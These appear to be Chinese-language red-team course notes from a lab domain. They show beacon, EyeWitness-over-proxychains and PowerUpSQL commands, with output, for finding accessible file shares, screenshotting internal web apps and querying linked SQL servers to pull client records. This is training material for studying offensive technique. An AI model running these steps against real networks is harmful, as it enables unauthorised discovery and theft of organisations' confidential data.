# Data Hunting & Exfiltration

数据通常会存储在共享文件夹、数据库、SharePoint、内部 wiki 等的各种位置.

# File Shares

```Find-DomainShare```查找所有共享目录，加```-CheckShareAccess ```表示可以访问的
```
beacon> powershell Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess

Name     Type Remark              ComputerName      
----     ---- ------              ------------      
data$       0                     dc-1.cyberbotic.io

beacon> ls \\dc-1.cyberbotic.io\data$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 17kb     fil     03/25/2021 12:54:11   63ec08038c04ac60dab340ee9569e690dataMar-25-2021.xlsx
 214kb    fil     03/25/2021 13:02:53   Apple iPhone 8.ai
 1mb      fil     03/25/2021 13:02:55   Boeing 787-8 DreamLiner Air Canada.ai
 540kb    fil     03/25/2021 13:02:54   Caterpillar 345D L.ai
 829kb    fil     03/25/2021 13:02:55   Ducati 1098R (2011).ai
 895kb    fil     03/25/2021 13:02:55   Volkswagen Caddy Maxi (2020).ai
```

# Internal Web Apps

[EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness)这个工具可以从内部网络应用中截取数据截图等信息，主要用于内部网络应用的信息收集

> EyeWitness 旨在截取网站的屏幕截图，提供一些服务器标头信息，并在已知的情况下识别默认凭据。

> EyeWitness 设计为在 Kali Linux 上运行。它会自动检测您使用 -f 标志提供的文件，作为每个新行上带有 URL 的文本文件、nmap xml 输出或 nessus xml 输出。--timeout 标志是完全可选的，它允许您在尝试呈现和截屏网页时提供最大等待时间。

```
root@kali:/opt/EyeWitness/Python# cat /root/targets.txt
10.10.17.71
10.10.17.25
10.10.17.68

root@kali:/opt/EyeWitness/Python# proxychains4 ./EyeWitness.py --web -f /root/targets.txt -d /root/dev --no-dns --no-prompt

Starting Web Requests (3 Hosts)
Attempting to screenshot http://10.10.17.71
[*] WebDriverError when connecting to http://10.10.17.71
Attempting to screenshot http://10.10.17.25
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.17.25:80  ...  OK
Attempting to screenshot http://10.10.17.68
[*] WebDriverError when connecting to http://10.10.17.68
Finished in 12.967030048370361 seconds
```

```
PS C:\Users\Administrator\Desktop> pscp -r root@kali:/root/dev 。
```

![alt alt](https://rto-assets.s3.eu-west-2.amazonaws.com/data-hunting/eyewitness-report.png?width=1920)

# Databases

使用工具：PowerUpSQL

```Get-SQLColumnSampleDataThreaded```在一个或多个实例中搜索列名中包含特定关键字的数据库
```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "project" -SampleSize 5 | select instance, database, column, sample | ft -autosize

Instance                     Database Column      Sample         
--------                     -------- ------      ------         
srv-1.dev.cyberbotic.io,1433 master   ProjectName Mild Sun       
srv-1.dev.cyberbotic.io,1433 master   ProjectName Warm Venus     
srv-1.dev.cyberbotic.io,1433 master   ProjectName Grim Lyric     
srv-1.dev.cyberbotic.io,1433 master   ProjectName Precious Castle
srv-1.dev.cyberbotic.io,1433 master   ProjectName Fine Devil  
```

```Get-SQLQuery```搜索链接
```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE
------------- ------------ ----------            ----------
master        dbo          spt_fallback_db       BASE TABLE
master        dbo          spt_fallback_dev      BASE TABLE
master        dbo          spt_fallback_usg      BASE TABLE
master        dbo          spt_values            VIEW      
master        dbo          spt_monitor           BASE TABLE
master        dbo          MSreplication_options BASE TABLE
master        dbo          VIPClients            BASE TABLE
```

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns')"

column_name
-----------
City
Name
OrgNumber
Street
VIPClientsID
```

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 OrgNumber from master.dbo.VIPClients')"

OrgNumber  
---------  
65618655299
69838663099
12289506999
73723428599
51766460299
```